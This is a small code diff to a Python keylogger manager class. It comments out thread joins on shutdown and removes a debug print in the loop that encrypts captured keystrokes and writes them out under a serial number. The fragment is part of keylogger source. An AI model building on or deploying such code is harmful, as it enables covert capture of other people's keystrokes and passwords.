@@ -23,10 +23,10 @@ class KeyLoggerManager(IKeyLoggerManager):
         self.__is_logging = False
         if hasattr(self, 'listener'):
             self.listener.stop()
-        if self.__logger_thread.is_alive():
-            self.__logger_thread.join()
-        if self.__send_data_thread.is_alive():
-            self.__send_data_thread.join()
+        # if self.__logger_thread.is_alive():
+        #     self.__logger_thread.join()
+        # if self.__send_data_thread.is_alive():
+        #     self.__send_data_thread.join()
         sys.exit(0)
 
     def __listen(self):
@@ -38,7 +38,6 @@ class KeyLoggerManager(IKeyLoggerManager):
             data = self.__key_logger.get_logged_keys()
             encrypt_data = {self.__encryptor.encrypt(key): self.__encryptor.encrypt(value) for key, value in
                             data.items()}
-            # print(data)
             self.__writer.write(self.__serial_number, encrypt_data)
             self.__key_logger.clear_logged_keys()
 
